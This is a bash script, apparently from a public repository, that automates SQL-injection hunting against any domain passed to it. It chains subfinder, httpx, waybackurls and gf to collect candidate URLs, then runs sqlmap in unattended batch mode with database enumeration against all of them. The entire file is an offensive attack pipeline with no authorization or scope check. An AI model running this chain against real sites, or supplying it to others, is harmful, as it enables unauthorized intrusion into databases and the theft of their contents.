# sql-finding-script



#!/bin/bash

if [ $# -eq 0 ]
  then
    echo "Please provide the target domain as an argument."
    exit 1
fi

target_domain=$1

# Create a directory with the target domain name
target_dir="$target_domain-$(date '+%Y-%m-%d_%H:%M:%S')"
mkdir $target_dir

# Change into the target directory
cd $target_dir

# Run Subfinder and output results to domains.txt
subfinder -d $target_domain | tee -a domains.txt

# Use httpx to find alive URLs and output results to urls-alive.txt
cat domains.txt | httpx | tee -a urls-alive.txt

# Use waybackurls to find URLs from archive and output results to urls-check.txt
cat urls-alive.txt | waybackurls | tee -a urls-check.txt

# Use gf to find SQL injection vulnerabilities and output results to sql.url
gf sqli urls-check.txt >> sql.url

# Use sqlmap to test SQL injection on vulnerable URLs and output results to file
sqlmap -m sql.url --dbs --batch > sqlmap-results.txt

# Go back to the parent directory
cd ..
